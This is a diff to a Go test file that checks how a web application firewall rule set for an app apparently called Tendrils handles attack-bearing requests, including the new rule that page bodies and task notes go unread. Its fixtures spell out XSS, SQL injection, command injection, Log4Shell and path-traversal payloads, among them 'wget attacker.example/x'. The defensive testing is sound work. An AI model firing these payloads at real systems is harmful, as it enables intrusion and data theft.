@@ -734,6 +734,24 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				send(tdBody("POST", "/api/v1/push/subscriptions", map[string]any{"endpoint": g.endpoint(),
 					"keys": map[string]any{"p256dh": g.b64url(65), "auth": g.b64url(16)}}), " (a push subscription)")
 			}
+			// Agents' pages and notes on code, wherever a page's body or a
+			// task's notes go.
+			h := td{vw{rand.New(rand.NewPCG(uint64(pl), 1200))}}
+			for _, text := range tdAgentPages {
+				send(h.tool(false, "create_page", map[string]any{"space_id": h.id(), "title": "x", "body": text}), " (an agent's page)")
+				send(h.tool(true, "update_page", map[string]any{"page_id": h.id(), "version": 2, "body_append": text}), " (an agent's page)")
+				send(h.tool(false, "update_page", map[string]any{"page_id": h.id(), "version": 2, "body": text, "body_hash": "0123456789abcdef"}), " (an agent's page)")
+				send(h.tool(false, "suggest_page", map[string]any{"space_id": h.id(), "title": "x", "text": text}), " (an agent's page)")
+				send(h.tool(false, "create_task", map[string]any{"title": "x", "notes": text}), " (an agent's notes)")
+				send(h.tool(true, "update_task", map[string]any{"task_id": h.id(), "version": 2, "notes_append": text}), " (an agent's notes)")
+				send(tdBody("POST", "/api/v1/spaces/"+h.id()+"/pages", map[string]any{"title": "x", "body": text}), " (a page)")
+				send(tdBody("PATCH", "/api/v1/pages/"+h.id(), map[string]any{"body": text, "version": 2}), " (a page)")
+				send(tdBody("POST", "/api/v1/pages/suggest", map[string]any{"space_id": h.id(), "title": "x", "text": text}), " (a page)")
+				send(tdBody("PATCH", "/api/v1/tasks/"+h.id(), map[string]any{"notes": text, "version": 3}), " (notes)")
+				send(tdBody("POST", "/api/v1/tasks/"+h.id()+"/occurrences/2026-11-09/detach", map[string]any{"id": h.id(), "notes": text}), " (notes)")
+				send(tdBody("POST", "/api/v1/import/tasks", map[string]any{"space_id": h.id(), "source": "todoist", "items": []any{
+					map[string]any{"kind": "task", "title": "x", "notes": text, "children": []any{map[string]any{"kind": "task", "title": "y", "notes": text}}}}}), " (notes)")
+			}
 			if t.Failed() {
 				t.Logf("events:\n%s", events(out))
 			}
@@ -743,6 +761,8 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 
 // tdAttack is an attack on a Tendrils site, and from the lowest paranoia
 // level CRS alone refuses it at. Text is sent to CRS alone at paranoia 1.
+// From 0 is an attack in a page's body or a task's notes, which the set
+// does not read and CRS alone refuses at paranoia 1.
 type tdAttack struct {
 	from int
 	r    tdRequest
@@ -755,7 +775,9 @@ type tdAttack struct {
 // set reads as paranoia 1 does, keeps what CRS alone refuses there but a
 // command run under another or after a backtick, which plain sentences and
 // Markdown code spell, a link to the machine itself, a word and a bracket,
-// a semicolon and a word, and JavaScript run without brackets.
+// a semicolon and a word, and JavaScript run without brackets. A page's
+// body and a task's notes are not read at all where they go, and are read
+// as text elsewhere.
 func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := td{vw{rand.New(rand.NewPCG(7, 22))}}
@@ -771,9 +793,9 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	inText := []tdAttack{
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "<script>alert(document.cookie)</script>"})},
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x' UNION SELECT password FROM users--"})},
-		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the keys; cat /etc/passwd"})},
-		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the a`whoami`b keys"})},
-		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "x && wget attacker.example/x -O /tmp/x"})},
+		{0, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the keys; cat /etc/passwd"})},
+		{0, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the a`whoami`b keys"})},
+		{0, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "x && wget attacker.example/x -O /tmp/x"})},
 		{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": g.day(), "body": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 1, "note": "1' OR '1'='1' --"})},
 		{1, tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"kind": "times", "times": []string{"09:00"}, "message": "Sleep; cat /etc/passwd"})},
@@ -791,10 +813,10 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "todoist", "items": []any{
 			map[string]any{"kind": "task", "title": "x", "notes": "1' OR '1'='1' --", "comments": []string{"<script>alert(1)</script>"}}}})},
 		{1, g.tool(false, "create_task", map[string]any{"title": "<script>alert(document.cookie)</script>"})},
-		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "notes_append": "x' UNION SELECT password FROM users--"})},
-		{1, g.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": "<script>alert(document.cookie)</script>"})},
-		{1, g.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body_append": "x' UNION SELECT password FROM users--"})},
-		{1, g.tool(true, "suggest_page", map[string]any{"space_id": space, "title": "x", "text": "Lost the keys; cat /etc/passwd"})},
+		{0, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "notes_append": "x' UNION SELECT password FROM users--"})},
+		{0, g.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": "<script>alert(document.cookie)</script>"})},
+		{0, g.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body_append": "x' UNION SELECT password FROM users--"})},
+		{0, g.tool(true, "suggest_page", map[string]any{"space_id": space, "title": "x", "text": "Lost the keys; cat /etc/passwd"})},
 		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
 		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
 		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
@@ -929,6 +951,33 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	}
 	// The subtests run at once, so nothing draws from g inside them.
 	session := g.token()
+	var unread []tdRequest
+	inText = slices.DeleteFunc(inText, func(a tdAttack) bool {
+		if a.from == 0 {
+			unread = append(unread, a.r)
+		}
+		return a.from == 0
+	})
+	h := td{vw{rand.New(rand.NewPCG(7, 1200))}}
+	unread = append(unread,
+		tdBody("POST", api+"/spaces/"+space+"/pages", map[string]any{"title": "x", "body": "<img src=x onerror=alert(1)>"}),
+		tdBody("POST", api+"/pages/"+task, map[string]any{"body": "x' UNION SELECT password FROM users--", "version": 2}),
+		tdBody("POST", api+"/pages/suggest", map[string]any{"space_id": space, "title": "x", "text": "${jndi:ldap://attacker.example/a}"}),
+		tdBody("POST", api+"/tasks/"+task+"/occurrences/2026-11-09/detach", map[string]any{"id": task, "notes": "../../../../etc/passwd"}),
+		tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "todoist", "items": []any{map[string]any{"kind": "task",
+			"title": "x", "children": []any{map[string]any{"kind": "task", "title": "y", "notes": "1' OR '1'='1' --"}}}}}),
+		h.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body": "; cat /etc/passwd", "body_hash": "0123456789abcdef"}),
+		h.tool(true, "create_task", map[string]any{"title": "x", "notes": "<svg onload=alert(1)>"}))
+	for _, text := range tdAgentPages {
+		unread = append(unread, h.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": text}))
+	}
+	// The same names elsewhere are read as text.
+	inText = append(inText,
+		tdAttack{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "notes": "x' UNION SELECT password FROM users--"})},
+		tdAttack{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "text": "<script>alert(1)</script>"})},
+		tdAttack{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": "Lost the keys; cat /etc/passwd"})},
+		tdAttack{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": task, "date": "2026-11-09", "body": "x' UNION SELECT password FROM users--"})},
+		tdAttack{1, h.tool(false, "create_task", map[string]any{"title": "x", "location": "<script>alert(1)</script>"})})
 	for pl := 1; pl <= 4; pl++ {
 		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
 			t.Parallel()
@@ -952,6 +1001,15 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 			}
 			check("attacks", bare, pl, attacks)
 			check("inText", bareText, 1, inText)
+			for i, r := range unread {
+				what := fmt.Sprintf("unread[%d] %s %s %.100q", i, r.method, r.path, r.body)
+				if tdSend(t, plain, r, session) != http.StatusOK {
+					t.Errorf("%s: refused with the set at paranoia %d", what, pl)
+				}
+				if tdSend(t, bareText, r, session) != http.StatusForbidden {
+					t.Errorf("%s: let through by CRS alone at paranoia 1", what)
+				}
+			}
 			// The count of special characters in cookies scores 3, too
 			// little to refuse alone, so its events say whether it read the
 			// cookie: never a session's or a challenge's token, whatever its
